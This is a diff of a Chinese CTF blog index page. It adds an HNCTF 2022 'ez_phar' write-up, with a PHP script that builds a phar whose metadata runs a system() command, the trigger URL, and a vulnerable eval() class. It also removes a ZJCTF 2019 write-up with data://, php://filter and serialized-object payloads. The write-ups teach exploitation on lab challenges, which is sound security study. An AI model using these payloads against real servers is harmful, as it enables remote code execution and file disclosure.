@@ -1906,6 +1906,8 @@
       
         
       
+        
+      
     
     
     
@@ -2623,6 +2625,36 @@
   
   
     <li class="md-nav__item">
+      <a href="../../category/%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    日志注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="../../category/%E6%B5%81%E5%8C%85%E8%A3%85%E5%99%A8/" class="md-nav__link">
         
   
@@ -2820,6 +2852,118 @@
       <header class="md-typeset">
         <h1 id="wp">WP 博客<a class="headerlink" href="#wp" title="Permanent link">&para;</a></h1>
       </header>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-10-27 00:00:00+00:00">2026-10-27</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../../category/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-meta__link">反序列化</a>, 
+              <a href="../../category/phar/" class="md-meta__link">phar</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="hnctf-2022-week3-ez_phar"><a class="toclink" href="../../hnctf2022-ezphar/">[HNCTF 2022 WEEK3] ez_phar</a></h2>
+<h3 id="_1"><a class="toclink" href="../../hnctf2022-ezphar/#_1">源码</a></h3>
+<p><img alt="index.php 源码" src="../../../assets/images/hnctf2022-ezphar/01-index.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nb">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="k">class</span> <span class="nc">Flag</span><span class="p">{</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>    <span class="k">public</span> <span class="nv">$code</span><span class="p">;</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>        <span class="c1">// TODO: Implement __destruct() method.</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span><span class="p">);</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>    <span class="p">}</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="p">}</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="cp">?&gt;</span>
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="x">upload something</span>
+</span></code></pre></div>
+<p>审计代码发现只要触发 <code>__destruct</code> 就可以执行代码，所以要想办法触发 <code>__destruct</code>。</p>
+<p>想到 phar 反序列化可以在<strong>没有 <code>unserialize()</code></strong> 的情况下触发 <code>__destruct</code> —— 代码里唯一的入口就是 <code>file_exists($filename)</code>，而它正好是能吃 <code>phar://</code> 的文件函数。</p>
+<p><strong>为什么能这样</strong>：phar 文件的 manifest 里可以存一段序列化 metadata；任何函数只要访问 <code>phar://</code> 开头的路径，PHP 就会解析这个 phar，解析时把 metadata <strong>自动反序列化</strong> —— 于是对象被重建，脚本结束时 <code>__destruct()</code> 自动执行。</p>
+<h3 id="_2"><a class="toclink" href="../../hnctf2022-ezphar/#_2">找上传点</a></h3>
+<p>源代码强调了 upload，去访问一下 <code>upload.php</code>。</p>
+<p>先随便尝试上传一个 txt 文件，提示只能 jpg/jpeg。</p>
+<p><strong>将 txt 文件修改后缀可以直接上传</strong>，所以就明确了这道题的方向：构造一个 phar 文件，修改后缀为 jpg 上传之后通过 <code>phar://</code> 触发。</p>
+<h3 id="phar"><a class="toclink" href="../../hnctf2022-ezphar/#phar">造 phar</a></h3>
+<p><img alt="造 phar 的脚本" src="../../../assets/images/hnctf2022-ezphar/02-ds.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="k">class</span> <span class="nc">Flag</span> <span class="p">{</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>    <span class="k">public</span> <span class="nv">$code</span><span class="p">;</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="p">}</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="nv">$f</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Flag</span><span class="p">();</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="nv">$f</span><span class="o">-&gt;</span><span class="na">code</span> <span class="o">=</span> <span class="s2">"system('cat /fffl11laaaggg');"</span><span class="p">;</span>   <span class="c1">// 第一步是 ls / 先找到 flag 文件</span>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="nv">$p</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="no">__DIR__</span><span class="o">.</span><span class="s1">'/b.phar'</span><span class="p">);</span>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="nv">$p</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="nv">$p</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s1">'test.txt'</span><span class="p">,</span> <span class="s1">'x'</span><span class="p">);</span>
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="nv">$p</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">'&lt;?php __HALT_COMPILER(); ?&gt;'</span><span class="p">);</span>
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="nv">$p</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a><span class="nv">$p</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a><span class="cp">?&gt;</span>
+</span></code></pre></div>
+<p>php 文件写好后通过 shell 执行：</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">php</span><span class="p">.</span><span class="n">exe</span> <span class="n">-d</span> <span class="n">phar</span><span class="p">.</span><span class="n">readonly</span><span class="p">=</span><span class="n">0</span> <span class="n">ds</span><span class="p">.</span><span class="n">php</span>
+</span></code></pre></div>
+<p>就会生成一个 <code>b.phar</code> 的文件，将其后缀改完后上传。</p>
+<h3 id="_3"><a class="toclink" href="../../hnctf2022-ezphar/#_3">触发</a></h3>
+<p><strong>第一次我让 <code>code</code> 写的是 <code>ls /</code>（想先找 flag 文件），页面返回：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>Parse error: syntax error, unexpected end of file
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>in /var/www/html/index.php(7) : eval()'d code on line 1
+</span></code></pre></div>
+<p><strong>这行报错其实是</strong>最好的证据** —— 它同时说明了三件事：**</p>
+<table>
+<thead>
+<tr>
+<th>报错里的信息</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>eval()'d code</code></td>
+<td><code>__destruct()</code> 真的执行了</td>
+</tr>
+<tr>
+<td><code>index.php(7)</code></td>
+<td>就是源码里 <code>eval($this-&gt;code);</code> 那一行</td>
+</tr>
+<tr>
+<td><code>syntax error</code></td>
+<td>phar 被解析、metadata 反序列化成功，只是 <code>ls /</code> 不是合法 PHP</td>
+</tr>
+</tbody>
+</table>
+<p><strong>也就是说链路已经通了，只是内容不对。</strong> 把 <code>code</code> 换成合法的 PHP 语句后：</p>
+<p>最终 payload：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>?filename=phar://upload/b.jpg/test.txt
+</span></code></pre></div>
+<p>成功得到 flag。</p>
+    
+    
+  </div>
+</article>
       
         <article class="md-post md-post--excerpt">
   <header class="md-post__header">
@@ -4036,67 +4180,6 @@ Firefox：存储 → Cookie</p>
 </table>
 <p><strong>第 3、4、5 关其实是同一个病根：</strong>服务端信任了客户端可控的输入（IP 头、Cookie、语言标记）。</p>
 <p><strong>第 1 和第 6 关是同一个病根：</strong><code>==</code> 松散比较。</p>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-23 00:00:00+00:00">2026-10-23</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="../../category/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="md-meta__link">文件包含</a>, 
-              <a href="../../category/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-meta__link">反序列化</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 2 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="zjctf-2019-nizhuansiwei"><a class="toclink" href="../../zjctf-nizhuansiwei/">[ZJCTF 2019] NiZhuanSiWei</a></h2>
-<p>先进行代码审计，有三个参数：<code>text</code>、<code>file</code>、<code>password</code>，一个一个来。</p>
-<p><img alt="index.php 源码" src="../../../assets/images/zjctf/01-index.png" /></p>
-<h3 id="text"><a class="toclink" href="../../zjctf-nizhuansiwei/#text">一、text</a></h3>
-<p>因为 <code>file_get_contents</code> 读的是文件，所以用 <code>data</code> 协议，构造 payload：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>?text=data://text/plain,welcome to the zjctf
-</span></code></pre></div>
-<p>成功。</p>
-<p><img alt="welcome to the zjctf" src="../../../assets/images/zjctf/02-welcome.png" /></p>
-<h3 id="file"><a class="toclink" href="../../zjctf-nizhuansiwei/#file">二、file</a></h3>
-<p>不能包含 <code>flag.php</code>，这个很可能就是 flag。他注释在旁边有一个 <code>useless.php</code>，先读一下文件。</p>
-<p>但是 <code>include</code> 会将其中的 PHP 代码直接执行而不会打印出来（里面没 echo 的情况下，一般都没有），所以这里利用 PHP 伪协议直接将其转换为 base64 的数据，就不会被执行了：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>php://filter/read=convert.base64-encode/resource=useless.php
-</span></code></pre></div>
-<p>对其进行解码后，接着审计代码。</p>
-<p><img alt="useless.php 源码" src="../../../assets/images/zjctf/03-useless.png" /></p>
-<h3 id="password"><a class="toclink" href="../../zjctf-nizhuansiwei/#password">三、password</a></h3>
-<p>这里看到了 <code>Flag</code> 类的形式：一个 <code>$file</code>，一个打印函数，注释给了提示 <code>flag.php</code>。</p>
-<p>再根据最开始那个代码中 <code>password</code> 会 <code>unserialize($file)</code> 然后打印出来，所以如果要让他打印出 <code>flag.php</code>，就要序列化一个 <code>file</code> 为 <code>flag.php</code> 的类。</p>
-<p>依据那个类的形式进行序列化后，就可以得到 <code>password</code> 的值了。</p>
-<p><img alt="本地生成序列化" src="../../../assets/images/zjctf/04-serialize.png" /></p>
-<h3 id="payload"><a class="toclink" href="../../zjctf-nizhuansiwei/#payload">四、最终 payload</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
-</span></code></pre></div>
-<p><img alt="拿到 flag" src="../../../assets/images/zjctf/05-flag.png" /></p>
-<h3 id="_1"><a class="toclink" href="../../zjctf-nizhuansiwei/#_1">踩的坑</a></h3>
-<p><code>file</code> 写成了 <code>flie</code>，半天没找到错在哪。</p>
-<p><strong>请别打错了。</strong></p>
     
     
   </div>
